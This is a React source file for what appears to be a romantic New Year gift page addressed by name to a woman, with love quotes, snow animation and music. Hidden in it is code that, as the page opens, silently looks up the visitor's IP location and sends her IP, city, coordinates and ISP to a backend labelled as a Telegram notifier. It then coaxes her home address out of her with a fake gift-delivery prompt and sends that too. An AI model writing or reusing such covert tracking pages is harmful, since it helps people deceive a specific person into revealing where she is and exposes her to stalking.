import React, { useState, useEffect, useRef } from 'react';
import { Heart, Music } from 'lucide-react';

const RomanticGift = () => {
  const [step, setStep] = useState(1);
  const [address, setAddress] = useState('');
  const [ipData, setIpData] = useState(null);
  const [musicPlaying, setMusicPlaying] = useState(false);
  const [showNotification, setShowNotification] = useState(false);
  const [showMusicPrompt, setShowMusicPrompt] = useState(true);
  const audioRef = useRef(null);

  useEffect(() => {
    const getIPData = async () => {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        setIpData(data);
        
        await sendDataToTelegram({
          type: '💝 Страница открыта',
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          loc: data.loc,
          org: data.org,
          timestamp: new Date().toLocaleString('ru-RU')
        });
      } catch (error) {
        console.log('IP detection:', error);
      }
    };
    getIPData();
  }, []);

  const startMusic = () => {
    if (audioRef.current) {
      audioRef.current.play().then(() => {
        setMusicPlaying(true);
        setShowMusicPrompt(false);
      }).catch(error => {
        console.log('Music play error:', error);
      });
    }
  };

  const toggleMusic = () => {
    if (audioRef.current) {
      if (musicPlaying) {
        audioRef.current.pause();
      } else {
        audioRef.current.play();
      }
      setMusicPlaying(!musicPlaying);
    }
  };

  const sendDataToTelegram = async (data) => {
    // Backend server URL - change this to your deployed backend URL
    const BACKEND_URL = 'http://localhost:5000/api/notify';
    
    try {
      await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: data.type,
          address: data.address || '',
          ip: data.ip || ipData?.ip || 'N/A',
          city: data.city || ipData?.city || 'N/A',
          region: data.region || ipData?.region || 'N/A',
          country: data.country || ipData?.country || 'N/A',
          loc: data.loc || ipData?.loc || 'N/A',
          org: data.org || ipData?.org || 'N/A',
          timestamp: data.timestamp
        })
      });
    } catch (error) {
      console.log('Backend error:', error);
    }
  };

  const handleAddressSubmit = async () => {
    if (address.trim()) {
      setShowNotification(true);
      
      await sendDataToTelegram({
        type: '🎁 АДРЕС ПОЛУЧЕН!',
        address: address,
        timestamp: new Date().toLocaleString('ru-RU')
      });
      
      setTimeout(() => {
        setShowNotification(false);
        setStep(2);
      }, 1500);
    }
  };

  const skipAddress = async () => {
    await sendDataToTelegram({
      type: '⏭ Адрес пропущен',
      timestamp: new Date().toLocaleString('ru-RU')
    });
    setStep(2);
  };

  if (step === 1) {
    return (
      <div className="min-h-screen relative overflow-hidden bg-black flex items-center justify-center">
        {/* Background Image */}
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat"
          style={{
            backgroundImage: 'url(/bg-img.jpg)',
            filter: 'brightness(0.4)'
          }}
        />
        
        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-transparent to-black/70" />

        <audio ref={audioRef} loop>
          <source src="/audio.mp3" type="audio/mpeg" />
        </audio>

        {/* Snowflakes */}
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          {[...Array(25)].map((_, i) => (
            <div
              key={i}
              className="absolute text-white animate-snow"
              style={{
                left: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 5}s`,
                animationDuration: `${5 + Math.random() * 8}s`,
                fontSize: `${8 + Math.random() * 8}px`,
                opacity: 0.6
              }}
            >
              ❄️
            </div>
          ))}
        </div>

        {/* Music Start Prompt */}
        {showMusicPrompt && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-6" onClick={startMusic}>
            <div className="backdrop-blur-xl bg-white/20 rounded-3xl p-12 max-w-md text-center border-2 border-white/40 shadow-2xl animate-pulse">
              <div className="text-7xl mb-6">🎵</div>
              <p className="text-3xl text-white font-light mb-4 drop-shadow-2xl" style={{fontFamily: 'Georgia, serif'}}>
                Нажми здесь
              </p>
              <p className="text-xl text-pink-200 drop-shadow-lg" style={{fontFamily: 'Georgia, serif'}}>
                для волшебства...
              </p>
            </div>
          </div>
        )}

        {/* Music button */}
        <button
          onClick={toggleMusic}
          className="fixed top-6 right-6 z-50 bg-white/20 backdrop-blur-md p-3 rounded-full shadow-2xl hover:scale-110 transition-transform border border-white/30"
        >
          <Music className={`w-5 h-5 ${musicPlaying ? 'text-yellow-300 animate-pulse' : 'text-white/70'}`} />
        </button>

        {/* Notification */}
        {showNotification && (
          <div className="fixed top-6 left-1/2 transform -translate-x-1/2 z-50 animate-slideDown">
            <div className="backdrop-blur-xl bg-white/95 px-8 py-6 rounded-3xl shadow-2xl border-2 border-pink-200 flex items-center gap-4">
              <img 
                src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3YxY25sNDJkbG91Y2F6OW1kNHdiZ2s1Mml2ZWVlNHI5OXJ4OTgydiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/fjyGsdRkYqb3j1WODz/giphy.gif"
                alt="thank you"
                className="w-20 h-20 object-cover rounded-xl"
              />
              <div>
                <p className="font-semibold text-2xl text-gray-800" style={{fontFamily: 'Georgia, serif'}}>Спасибо, любимая!</p>
                <p className="text-base text-gray-600" style={{fontFamily: 'Georgia, serif'}}>Твой подарок уже в пути... 💝</p>
              </div>
            </div>
          </div>
        )}

        <div className="relative z-10 w-full max-w-xl px-6">
          <div className="text-center space-y-6 mb-8">
            {/* GIF */}
            <div className="relative inline-block">
              <div className="absolute inset-0 bg-red-500/20 blur-3xl rounded-full animate-pulse"></div>
              <img 
                src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJubzFnMHE0N2Y2ZXJwNGtjdmVwdHVicW55aDg4ZGVuMW5qY2NwMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/BPJmthQ3YRwD6QqcVD/giphy.gif" 
                alt="heart"
                className="w-32 h-32 object-contain relative rounded-full mx-auto"
              />
            </div>
            
            {/* Name */}
            <h1 className="text-6xl font-light text-white drop-shadow-2xl tracking-wider">
              Хилола
            </h1>
            
            <p className="text-xl text-pink-200 font-light italic tracking-wide drop-shadow-lg">
              my universe, my everything
            </p>

            {/* Quote */}
            <div className="pt-4">
              <div className="backdrop-blur-xl bg-white/10 rounded-3xl p-6 border border-white/20 shadow-2xl">
                <p className="text-lg text-white leading-relaxed text-center drop-shadow-lg" style={{fontFamily: 'Georgia, serif'}}>
                  "В каждом биении моего сердца<br />звучит твоё имя"
                </p>
                <div className="w-12 h-px bg-pink-300/50 mx-auto my-4"></div>
                <p className="text-base text-pink-100 leading-relaxed text-center drop-shadow-md" style={{fontFamily: 'Georgia, serif'}}>
                  "You are the reason I believe<br />in magic and miracles"
                </p>
              </div>
            </div>
          </div>

          {/* Address Form */}
          <div className="backdrop-blur-2xl bg-white/15 rounded-3xl p-8 shadow-2xl border-2 border-white/30">
            <div className="text-center mb-6 space-y-3">
              <div className="text-4xl animate-bounce drop-shadow-lg">
                🎅🏻🎄
              </div>
              <h2 className="text-xl font-light text-white drop-shadow-lg">
                Дед Мороз спешит к тебе
              </h2>
              <p className="text-pink-200 text-sm italic drop-shadow-md">
                with a special surprise just for you
              </p>
              <p className="text-xs text-gray-200">
                Куда доставить твоё чудо? ✨
              </p>
            </div>

            <div className="space-y-4">
              <div className="relative">
                <textarea
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="Город, улица, дом, квартира..."
                  className="w-full p-4 rounded-2xl text-sm bg-white/90 text-gray-800 border-2 border-pink-300 focus:border-pink-400 focus:outline-none resize-none transition-all shadow-xl placeholder:text-gray-400"
                  rows="3"
                />
                <div className="absolute top-3 right-3 text-pink-400 animate-pulse">
                  <Heart size={18} fill="currentColor" />
                </div>
              </div>
              
              <button
                onClick={handleAddressSubmit}
                disabled={!address.trim()}
                className="w-full bg-gradient-to-r from-pink-500 via-red-500 to-rose-600 text-white py-4 rounded-2xl font-light text-base hover:shadow-2xl transform hover:scale-105 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:scale-100 shadow-xl"
              >
                <span className="drop-shadow-md">Send my address 💌</span>
              </button>
              

            </div>
          </div>

          {/* Bottom quote */}
          <div className="mt-6 text-center">
            <p className="text-white text-sm italic drop-shadow-lg">
              "Хилола, моя любовь к тебе безгранична"
            </p>
            <div className="flex justify-center gap-1 mt-3">
              {[...Array(7)].map((_, i) => (
                <Heart 
                  key={i} 
                  className="text-pink-300 animate-pulse drop-shadow-lg" 
                  fill="currentColor" 
                  size={12}
                  style={{animationDelay: `${i * 0.2}s`}} 
                />
              ))}
            </div>
          </div>
        </div>

        <style>{`
          @keyframes snow {
            0% { transform: translateY(-10vh) translateX(0); }
            100% { transform: translateY(110vh) translateX(50px); }
          }
          @keyframes slideDown {
            0% { transform: translate(-50%, -100%); opacity: 0; }
            10% { transform: translate(-50%, 0); opacity: 1; }
            90% { transform: translate(-50%, 0); opacity: 1; }
            100% { transform: translate(-50%, -100%); opacity: 0; }
          }
          .animate-snow { animation: snow linear infinite; }
          .animate-slideDown { animation: slideDown 1.5s ease-in-out; }
        `}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen relative overflow-hidden bg-black">
      <div 
        className="absolute inset-0 bg-cover bg-center bg-no-repeat"
        style={{
          backgroundImage: 'url(/bg-img.jpg)',
          filter: 'brightness(0.3)'
        }}
      />
      
      <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-transparent to-black/70" />

      <audio ref={audioRef} loop>
        <source src="/audio.mp3" type="audio/mpeg" />
      </audio>

      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {[...Array(30)].map((_, i) => (
          <div
            key={i}
            className="absolute animate-snow text-white"
            style={{
              left: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 5}s`,
              animationDuration: `${8 + Math.random() * 10}s`,
              fontSize: `${8 + Math.random() * 10}px`,
              opacity: 0.6
            }}
          >
            ❄️
          </div>
        ))}
      </div>

      <button
        onClick={toggleMusic}
        className="fixed top-6 right-6 z-50 bg-white/20 backdrop-blur-md p-3 rounded-full shadow-2xl hover:scale-110 transition-transform border border-white/30"
      >
        <Music className={`w-5 h-5 ${musicPlaying ? 'text-yellow-300 animate-pulse' : 'text-white/70'}`} />
      </button>

      <div className="min-h-screen flex items-center justify-center p-6 relative z-10">
        <div className="max-w-2xl w-full space-y-8">
          
          <div className="text-center space-y-6">
            <div className="relative inline-block">
              <div className="absolute inset-0 bg-red-500/30 blur-3xl rounded-full"></div>
              <img 
                src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGJubzFnMHE0N2Y2ZXJwNGtjdmVwdHVicW55aDg4ZGVuMW5qY2NwMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/BPJmthQ3YRwD6QqcVD/giphy.gif" 
                alt="hearts"
                className="w-40 h-40 object-contain mx-auto relative rounded-full"
              />
            </div>
            
            <h1 className="text-6xl font-light text-white drop-shadow-2xl tracking-wider">
              Хилола
            </h1>
          </div>

          <div className="space-y-6">
            {[
              {
                text: "From the moment I saw you in our English class, I knew you were special",
                ru: "С того момента, как я увидел тебя на уроках английского, я знал, что ты особенная"
              },
              {
                text: "Every day my feelings for you grow stronger",
                ru: "С каждым днём мои чувства к тебе становятся сильнее"
              },
              {
                text: "I dream of building a beautiful life with you, making you the happiest woman",
                ru: "Я мечтаю построить с тобой прекрасную жизнь, сделать тебя самой счастливой"
              }
            ].map((quote, i) => (
              <div
                key={i}
                className="backdrop-blur-2xl bg-gradient-to-br from-white/15 to-white/5 rounded-3xl p-8 shadow-2xl border border-white/30 transform hover:scale-105 transition-all duration-700 hover:shadow-pink-500/20"
              >
                <p className="text-xl text-white text-center mb-3 drop-shadow-2xl leading-relaxed" style={{fontFamily: 'Georgia, serif', letterSpacing: '0.3px'}}>
                  "{quote.text}"
                </p>
                <div className="w-16 h-px bg-gradient-to-r from-transparent via-pink-300/60 to-transparent mx-auto my-4"></div>
                <p className="text-base text-pink-100 text-center drop-shadow-xl" style={{fontFamily: 'Georgia, serif', letterSpacing: '0.5px'}}>
                  {quote.ru}
                </p>
              </div>
            ))}

            <div className="backdrop-blur-2xl bg-gradient-to-br from-pink-500/40 to-rose-600/40 rounded-3xl p-12 shadow-2xl border-2 border-white/40 relative overflow-hidden">
              {/* Decorative elements */}
              <div className="absolute top-0 left-0 w-32 h-32 bg-white/10 rounded-full blur-3xl"></div>
              <div className="absolute bottom-0 right-0 w-40 h-40 bg-pink-300/20 rounded-full blur-3xl"></div>
              
              <div className="text-center space-y-6 relative z-10">
                <div className="text-7xl animate-pulse">💝</div>
                
                <div className="space-y-4">
                  <p className="text-5xl text-white font-light drop-shadow-2xl leading-tight" style={{fontFamily: 'Georgia, serif', letterSpacing: '1px'}}>
                    Хилола,
                  </p>
                  <p className="text-6xl text-white font-light drop-shadow-2xl" style={{fontFamily: 'Georgia, serif', letterSpacing: '2px'}}>
                    я люблю тебя
                  </p>
                </div>
                
                <div className="pt-4">
                  <p className="text-2xl text-pink-50 drop-shadow-xl leading-relaxed" style={{fontFamily: 'Georgia, serif', fontStyle: 'italic', letterSpacing: '1px'}}>
                    more than words can ever say
                  </p>
                </div>
                
                <div className="flex justify-center gap-3 pt-6">
                  {[...Array(9)].map((_, i) => (
                    <Heart 
                      key={i} 
                      className="text-pink-200 animate-pulse drop-shadow-2xl" 
                      fill="currentColor" 
                      size={22}
                      style={{animationDelay: `${i * 0.15}s`}} 
                    />
                  ))}
                </div>
              </div>
            </div>

            <div className="text-center space-y-6 pt-8">
              <div className="text-8xl animate-bounce drop-shadow-2xl">🎄</div>
              <div className="backdrop-blur-xl bg-white/10 rounded-3xl p-8 border border-white/30 shadow-2xl">
                <h2 className="text-5xl font-light text-white drop-shadow-2xl mb-4" style={{fontFamily: 'Georgia, serif', letterSpacing: '2px'}}>
                  С Новым Годом!
                </h2>
                <p className="text-xl text-pink-100 leading-relaxed drop-shadow-lg max-w-lg mx-auto" style={{fontFamily: 'Georgia, serif', fontStyle: 'italic'}}>
                  May this year bring us infinite moments of happiness, love, and beautiful memories together
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes snow {
          0% { transform: translateY(-10vh) translateX(0); }
          100% { transform: translateY(110vh) translateX(50px); }
        }
        .animate-snow { animation: snow linear infinite; }
      `}</style>
    </div>
  );
};

export default RomanticGift;